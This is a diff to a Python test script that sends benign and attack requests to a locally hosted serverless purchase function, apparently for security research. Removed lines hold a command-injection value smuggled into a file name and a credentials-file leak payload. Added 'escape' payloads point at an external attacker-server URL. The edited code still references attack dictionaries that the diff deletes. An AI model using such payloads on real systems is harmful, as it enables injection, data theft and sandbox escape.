@@ -67,9 +67,9 @@ def perform_requests(
             future.result()
 
     print("UUID dictionary:")
-    # for uuid_key, value in uuid_dict.items():
-    #     request_type, response_string = value.type, value.resp
-    #     print(f"{uuid_key}: ({request_type}, {response_string})")
+    for uuid_key, value in uuid_dict.items():
+        request_type, response_string = value["type"], value["resp"]
+        print(f"{uuid_key}: ({request_type},\n-------------- {response_string})")
     with open(os.path.join(metadata_out_path, "metadata.json"), "w") as f:
         json.dump(uuid_dict, f, ensure_ascii=False, indent=4)
 
@@ -87,7 +87,7 @@ if __name__ == "__main__":
     )
     parser.add_argument(
         "--data_attack_type",
-        choices=["modify", "leak", "warm1", "warm2", "warm"],
+        choices=["modify", "leak", "warm1", "warm2", "warm", "cfattack", "escape"],
         required=True,
         help="Type of attack data",
     )
@@ -101,7 +101,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    url = "http://localhost:31112/function/zjy-2n-product-purchase"
+    url = "http://localhost:31112/function/zch-2n-product-purchase"
 
     headers_benign_template = {
         "Content-Type": "application/json",
@@ -115,36 +115,27 @@ if __name__ == "__main__":
         "uuid": "",  # This will be filled with random UUID
     }
 
-    data_attack_modify = {
+    data_attack_cfattack = {
         "id": 1,
         "user": "alice",
         "creditCard": "1234-5678-9",
-        "malicious": "sas3",
-        "fileName": "2.txt #\n echo '123' > 3.txt",
+        "cfattack":"true",
     }
 
-    data_attack_leak = {
+    data_attack_escape_1 = {
         "id": 1,
         "user": "alice",
         "creditCard": "1234-5678-9",
-        "malicious": "sas6",
-        "path": "credentials.txt",
+        "malicious": "escape_S1",
+        "attackserver": "https://gitee.com/jinyuchata/escape-host/raw/master"
     }
 
-    data_attack_warm_1 = {
+    data_attack_escape_2 = {
         "id": 1,
         "user": "alice",
         "creditCard": "1234-5678-9",
-        "malicious": "one",
-        "attackserver": "attackserver.openfaas-fn.svc.cluster.local:8888",
-    }
-
-    data_attack_warm_2 = {
-        "id": 1,
-        "user": "alice",
-        "creditCard": "1234-5678-9",
-        "malicious": "two",
-        "attackserver": "attackserver",
+        "malicious": "escape_S2",
+        "payload": ""
     }
 
     if args.data_attack_type == "modify":
@@ -157,6 +148,10 @@ if __name__ == "__main__":
         data_attack = [data_attack_warm_2]
     elif args.data_attack_type == "warm":
         data_attack = [data_attack_warm_1, data_attack_warm_2]
+    elif args.data_attack_type == "cfattack":
+        data_attack = [data_attack_cfattack]
+    elif args.data_attack_type == "escape":
+        data_attack = [data_attack_escape_1, data_attack_escape_2]        
 
     perform_requests(
         url,
